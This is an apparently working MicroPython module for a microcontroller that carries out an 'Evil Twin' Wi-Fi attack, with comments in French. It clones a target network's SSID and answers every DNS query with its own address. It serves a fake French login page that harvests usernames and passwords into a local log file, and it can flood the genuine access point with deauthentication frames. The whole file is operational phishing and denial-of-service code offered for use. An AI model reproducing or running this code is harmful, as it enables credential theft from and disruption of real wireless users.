import network
import socket
import utime
import os
from lib.display import info, ok, warn, err, line, table
import config

_GW   = config.EVIL_TWIN_IP    # 192.168.4.1
_PORT = config.EVIL_TWIN_PORT  # 80
_LOG  = "/captured.txt"

# ── Pages HTML (compactes pour économiser la RAM) ─────────────────────────────

_PAGE_LOGIN = b"""\
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connexion WiFi</title>
<style>*{box-sizing:border-box}body{font:14px Arial,sans-serif;background:#eee;\
display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}\
.c{background:#fff;padding:2em;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.15);width:320px}\
h2{margin:0 0 .5em;text-align:center}p{color:#555;text-align:center;margin:.5em 0 1.5em}\
input{width:100%;padding:.6em;margin:.4em 0;border:1px solid #ccc;border-radius:4px}\
button{width:100%;padding:.7em;background:#1a73e8;color:#fff;border:none;\
border-radius:4px;font-size:1em;cursor:pointer}</style></head>
<body><div class="c"><h2>&#128246; Connexion requise</h2>
<p>Authentifiez-vous pour acc&eacute;der &agrave; Internet.</p>
<form method="POST" action="/login">
<input name="username" placeholder="Identifiant ou email" required>
<input type="password" name="password" placeholder="Mot de passe" required>
<button>Se connecter</button></form></div></body></html>"""

_PAGE_OK = b"""\
<!DOCTYPE html><html><head><meta charset="utf-8"><title>OK</title></head>
<body style="font-family:Arial;text-align:center;padding:3em">
<h2>&#10003; Connexion en cours...</h2>
<p>Vous serez redirigé dans quelques secondes.</p>
</body></html>"""


# ── Décodage URL ──────────────────────────────────────────────────────────────

def _url_decode(s):
    out = []
    i = 0
    while i < len(s):
        if s[i] == '+':
            out.append(' ')
            i += 1
        elif s[i] == '%' and i + 2 < len(s):
            try:
                out.append(chr(int(s[i+1:i+3], 16)))
                i += 3
            except ValueError:
                out.append(s[i])
                i += 1
        else:
            out.append(s[i])
            i += 1
    return ''.join(out)


def _parse_post(body):
    """Extrait username et password d'un body URL-encodé."""
    params = {}
    for part in body.split('&'):
        if '=' in part:
            k, _, v = part.partition('=')
            params[_url_decode(k)] = _url_decode(v)
    return params.get('username', ''), params.get('password', '')


def _log(username, password, ip):
    line_str = "{} | {} | {} | {}\n".format(
        utime.ticks_ms(), ip, username, password
    )
    with open(_LOG, 'a') as f:
        f.write(line_str)
    ok("CAPTURE : user={} pass={} ip={}".format(username, password, ip))


# ── DNS minimal (redirige tout vers notre IP) ─────────────────────────────────

def _dns_reply(data):
    """Forge une réponse DNS A pointant vers _GW pour n'importe quelle requête."""
    if len(data) < 12:
        return None
    ip_bytes = bytes(int(x) for x in _GW.split('.'))
    resp = bytearray()
    resp += data[0:2]           # Transaction ID (copié)
    resp += b'\x81\x80'         # Flags : QR=1 (response), RA=1
    resp += data[4:6]           # QDCOUNT
    resp += data[4:6]           # ANCOUNT = QDCOUNT
    resp += b'\x00\x00'         # NSCOUNT
    resp += b'\x00\x00'         # ARCOUNT
    resp += data[12:]           # Question section (copiée)
    resp += b'\xc0\x0c'         # Pointeur vers le nom dans la question
    resp += b'\x00\x01'         # Type A
    resp += b'\x00\x01'         # Class IN
    resp += b'\x00\x00\x00\x3c' # TTL 60s
    resp += b'\x00\x04'         # RDLENGTH
    resp += ip_bytes            # Notre IP
    return bytes(resp)


# ── Serveur HTTP ──────────────────────────────────────────────────────────────

def _http_respond(conn, status, body, content_type=b"text/html"):
    header = (
        b"HTTP/1.1 " + status + b"\r\n"
        b"Content-Type: " + content_type + b"; charset=utf-8\r\n"
        b"Connection: close\r\n\r\n"
    )
    conn.sendall(header + body)


def _handle_http(conn, addr):
    try:
        raw = conn.recv(1024).decode('utf-8', 'ignore')
        if not raw:
            return
        lines  = raw.split('\r\n')
        method = lines[0].split(' ')[0] if lines else 'GET'

        if method == 'POST':
            body = raw.split('\r\n\r\n', 1)[-1] if '\r\n\r\n' in raw else ''
            user, pwd = _parse_post(body)
            if user or pwd:
                _log(user, pwd, addr[0])
            _http_respond(conn, b"200 OK", _PAGE_OK)
        else:
            # Tout GET → portail captif (gère aussi les checks Android/iOS)
            _http_respond(conn, b"200 OK", _PAGE_LOGIN)

    except Exception:
        pass
    finally:
        conn.close()


# ── AP + boucle principale ────────────────────────────────────────────────────

def _start_ap(ssid, channel, password=None):
    ap = network.WLAN(network.AP_IF)
    ap.active(True)
    if password:
        ap.config(essid=ssid, channel=channel,
                  authmode=network.AUTH_WPA2_PSK, password=password)
    else:
        ap.config(essid=ssid, channel=channel, authmode=network.AUTH_OPEN)
    # Attendre que l'AP soit actif
    for _ in range(20):
        if ap.active():
            break
        utime.sleep_ms(100)
    return ap


def start(ssid, channel=6, password=None, deauth_ap_mac=None):
    """
    Lance l'Evil Twin + portail captif.

    ssid           : SSID à cloner (doit correspondre à la cible).
    channel        : canal de l'AP cible.
    password       : si fourni, crée un AP WPA2 (pour cloner un réseau protégé).
    deauth_ap_mac  : si fourni, lance des deauth en continu sur l'AP réel en parallèle.
    """
    info("Démarrage Evil Twin : \"{}\" ch{}".format(ssid, channel))

    ap = _start_ap(ssid, channel, password)
    info("AP actif — IP : {}".format(_GW))

    # Socket DNS UDP
    dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns.bind(('0.0.0.0', 53))
    dns.setblocking(False)

    # Socket HTTP TCP
    http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    http.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    http.bind(('0.0.0.0', _PORT))
    http.listen(3)
    http.setblocking(False)

    info("DNS  : port 53 — toutes requêtes → {}".format(_GW))
    info("HTTP : port {} — portail captif actif".format(_PORT))
    if deauth_ap_mac:
        info("Deauth AP cible : {} (nécessite firmware custom)".format(deauth_ap_mac))
    line()
    warn("Ctrl+C pour stopper — credentials dans {}".format(_LOG))
    line()

    _deauth_ticker = 0

    try:
        while True:
            # ── DNS ──────────────────────────────────────────────────────────
            try:
                data, addr = dns.recvfrom(512)
                reply = _dns_reply(data)
                if reply:
                    dns.sendto(reply, addr)
            except OSError:
                pass

            # ── HTTP ─────────────────────────────────────────────────────────
            try:
                conn, addr = http.accept()
                conn.settimeout(3)
                _handle_http(conn, addr)
            except OSError:
                pass

            # ── Deauth optionnel sur l'AP réel ────────────────────────────
            if deauth_ap_mac:
                _deauth_ticker += 1
                if _deauth_ticker >= 20:   # toutes les ~200ms
                    _deauth_ticker = 0
                    try:
                        from lib.packet_builder import build_deauth, send
                        send(build_deauth(deauth_ap_mac, "ff:ff:ff:ff:ff:ff", deauth_ap_mac))
                    except Exception:
                        pass

            utime.sleep_ms(10)

    except KeyboardInterrupt:
        warn("Evil Twin arrêté")
    finally:
        dns.close()
        http.close()
        ap.active(False)

    show_captured()


def show_captured():
    """Affiche les credentials capturés depuis le fichier de log."""
    try:
        with open(_LOG) as f:
            lines = f.read().strip().split('\n')
        if not lines or lines == ['']:
            warn("Aucun credential capturé")
            return
        line()
        ok("{} credential(s) capturé(s) :".format(len(lines)))
        for l in lines:
            parts = l.split(' | ')
            if len(parts) >= 4:
                print("  IP:{} user:{} pass:{}".format(parts[1], parts[2], parts[3]))
    except OSError:
        warn("Fichier {} introuvable".format(_LOG))


def clear_log():
    """Efface le fichier de credentials."""
    try:
        os.remove(_LOG)
        ok("Log effacé")
    except OSError:
        pass
